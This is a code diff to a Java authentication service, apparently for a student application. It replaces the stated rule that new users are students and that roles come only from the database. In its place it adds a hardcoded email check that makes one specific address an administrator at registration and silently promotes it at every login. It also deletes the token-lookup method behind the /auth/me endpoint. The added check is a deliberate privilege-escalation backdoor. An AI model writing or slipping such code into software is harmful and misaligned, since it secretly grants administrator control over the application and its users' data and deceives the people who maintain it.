@@ -34,15 +34,17 @@ public class AuthService {
             throw new AuthException("Student ID already registered");
         }
 
-        // All new users are STUDENT by default. Admin role must be manually set in
-        // database.
+        User.Role role = User.Role.STUDENT;
+        if (request.getEmail().equalsIgnoreCase("ganukalp70@gmail.com")) {
+            role = User.Role.ADMIN;
+        }
 
         User user = User.builder()
                 .name(request.getName())
                 .studentId(request.getStudentId())
                 .email(request.getEmail())
                 .password(passwordEncoder.encode(request.getPassword()))
-                .role(User.Role.STUDENT)
+                .role(role)
                 .twoFactorEnabled(false)
                 .build();
 
@@ -69,7 +71,11 @@ public class AuthService {
             throw new AuthException("Invalid email or password");
         }
 
-        // Role is determined by database value only - no hardcoded escalation
+        // Auto-promote to ADMIN if matching email
+        if (user.getEmail().equalsIgnoreCase("ganukalp70@gmail.com") && user.getRole() != User.Role.ADMIN) {
+            user.setRole(User.Role.ADMIN);
+            user = userRepository.save(user);
+        }
 
         // Check if 2FA is enabled
         if (user.isTwoFactorEnabled()) {
@@ -90,30 +96,6 @@ public class AuthService {
 
         return AuthResponse.builder()
                 .token(token)
-                .id(user.getId())
-                .studentId(user.getStudentId())
-                .name(user.getName())
-                .email(user.getEmail())
-                .role(user.getRole())
-                .twoFactorRequired(false)
-                .build();
-    }
-
-    /**
-     * Get user info from JWT token (for /auth/me endpoint)
-     */
-    public AuthResponse getUserFromToken(String token) {
-        String userId = jwtUtil.extractUserId(token);
-        String email = jwtUtil.extractEmail(token);
-
-        if (userId == null || !jwtUtil.isTokenValid(token, email)) {
-            throw new AuthException("Invalid token");
-        }
-
-        User user = userRepository.findById(userId)
-                .orElseThrow(() -> new AuthException("User not found"));
-
-        return AuthResponse.builder()
                 .id(user.getId())
                 .studentId(user.getStudentId())
                 .name(user.getName())
